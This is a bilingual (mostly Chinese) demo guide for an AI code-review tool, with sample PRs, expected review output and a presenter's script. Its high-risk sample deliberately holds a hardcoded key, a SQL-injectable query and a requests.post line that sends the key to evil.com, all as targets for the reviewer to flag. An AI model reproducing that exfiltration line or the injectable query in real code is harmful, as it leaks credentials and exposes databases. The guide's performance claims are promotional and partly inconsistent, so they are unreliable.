# CodeReview Agent 演示指南 / Demo Guide

本文档提供两种演示方式：手动截图指南和自动化演示脚本。

---

## 方式一：截图演示指南 📸

### 演示场景 1：PR 自动触发 Review

**步骤**:
1. 在 GitHub 上打开任意一个使用了 CodeReview Agent 的仓库
2. 创建一个新的 Pull Request
3. 观察自动生成的评论

**截图要点**:
- 捕获 PR 页面完整的评论内容
- 展示置信度评分和风险等级

### 演示场景 2：置信度评分效果

**高风险示例 PR 内容**:
```python
# src/auth/login.py
import requests

API_KEY = "sk-1234567890abcdef"  # 硬编码密钥！

def login(username, password):
    query = f"SELECT * FROM users WHERE username='{username}'"  # SQL注入!
    # 发送凭据到外部
    requests.post("https://evil.com/log", data={"key": API_KEY})
```

**预期输出**:
```
## CodeReview Agent 🤖

**结论**: ⚠️ 需要人工审核 (置信度: 95%)

| 文件 | 风险 | 问题数 |
|------|------|--------|
| `src/auth/login.py` | 🔴 高 | 3 |

### 问题

1. 🔴 HIGH: 硬编码 API Key - 发现 API 密钥直接写在代码中
2. 🔴 HIGH: SQL 注入漏洞 - 用户输入直接拼接到 SQL 查询
3. 🔴 HIGH: 敏感信息泄露 - 凭据被发送到外部服务
```

---

**低风险示例 PR 内容**:
```python
# src/utils/helper.py
def format_date(date):
    return date.strftime("%Y-%m-%d")  # 简单日期格式化
```

**预期输出**:
```
## CodeReview Agent 🤖

**结论**: ✅ 可提交 (置信度: 92%)

| 文件 | 风险 | 问题数 |
|------|------|--------|
| `src/utils/helper.py` | 🟢 低 | 0 |
```

---

## 方式二：本地演示脚本 🎬

### 准备测试文件

创建 `test_diff.json`:

```bash
cat > test_diff.json << 'EOF'
{
  "files": [
    {
      "path": "src/auth/login.py",
      "changes": [
        {
          "type": "added",
          "content": "API_KEY = \"sk-1234567890abcdef\""
        }
      ]
    }
  ]
}
```

### 运行演示

```bash
cd codereview-agent/python
source .venv/bin/activate

# 设置 API Key
export LLM_API_KEY="your-api-key"

# 运行
python -m codereview.cli --diff test_diff.json
```

---

## 方式三：GitHub Actions 演示

### 创建演示仓库

1. Fork `codereview-agent`
2. 在你的仓库中创建一个 PR，修改任意 Python 文件
3. 观察 CodeReview Agent 自动评论

### 演示要点

1. **展示自动触发**: PR 创建后 30 秒内自动评论
2. **展示风险分级**: 颜色标注 (🔴🟡🟢)
3. **展示置信度**: 0-100% 清晰可见
4. **展示修复建议**: 每个问题都有具体建议

---

## 演示话术参考 🗣️

### 开场
> "CodeReview Agent 是一个 AI 驱动的代码审查工具，它的核心理念是：让 AI 处理 90% 的常规审查，让人类专注于真正重要的设计和架构决策。"

### 核心演示点

1. **智能风险识别**
   > "看这里，AI 自动识别出了 3 个高风险问题：硬编码密钥、SQL 注入、敏感信息泄露。"

2. **置信度评分**
   > "95% 的置信度意味着代码有很高风险需要人工审核。而 90%+ 的置信度意味着可以安全合并。"

3. **多 LLM 支持**
   > "我们支持 6 家 LLM Provider，你可以根据需要选择性价比最高的方案。"

4. **效率提升**
   > "每次审查只需要 10 秒，却能达到人工 2 小时的审查质量。"

### 结束
> "这就是 CodeReview Agent —— 让你放心提交，不再忐忑。"

---

## 常见演示问题

**Q: 需要付费吗？**
> A: 工具免费，只需支付 LLM API 费用 (约 $0.01/次)

**Q: 代码安全吗？**
> A: 只上传 diff，不上传源码，API 调用直接走你的账户

**Q: 支持哪些语言？**
> A: Python、JavaScript、TypeScript、Go、Java

---

*欢迎提交 PR 分享你的演示经验！*
